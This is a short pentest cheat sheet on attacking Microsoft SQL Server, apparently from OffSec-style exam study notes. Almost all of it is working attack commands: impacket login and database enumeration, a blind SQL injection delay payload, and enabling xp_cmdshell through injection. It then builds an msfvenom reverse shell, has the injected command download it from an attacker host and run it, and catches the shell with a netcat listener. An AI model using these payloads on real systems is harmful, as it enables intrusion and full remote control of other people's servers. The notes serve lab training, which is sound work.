# MSSQL

{% code overflow="wrap" %}
```sh
impacket-mssqlclient {username]:{password}@192.168.50.18 -windows-auth
```
{% endcode %}

```sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
#where offsec is db name and users is table name
```

### <mark style="background-color:purple;">Blind SQLi</mark>

```sql
' WAITFOR DELAY '0:0:5'--
```

### <mark style="background-color:purple;">Command Execution - xp\_cmdshell</mark>

enable xp\_cmdshell:

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

```sql
EXECUTE xp_cmdshell 'whoami';
```

#### SQLi command execution

enable xp\_cmdshell via sqli:

{% code overflow="wrap" %}
```sql
'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -
```
{% endcode %}

create reverse shell payload:

{% code overflow="wrap" %}
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f exe -o shell.exe
```
{% endcode %}

upload reverse shell payload via sqli:

{% code overflow="wrap" %}
```sql
'; EXECUTE xp_cmdshell "powershell.exe wget http://kali_ip/shell.exe -OutFile c:\Users\Public\shell.exe" -- -
```
{% endcode %}

execute payload:

```sh
nc -lvnp 4444
```

{% code overflow="wrap" %}
```sql
'; EXECUTE xp_cmdshell "powershell.exe c:\Users\Public\shell.exe" -- 
```
{% endcode %}
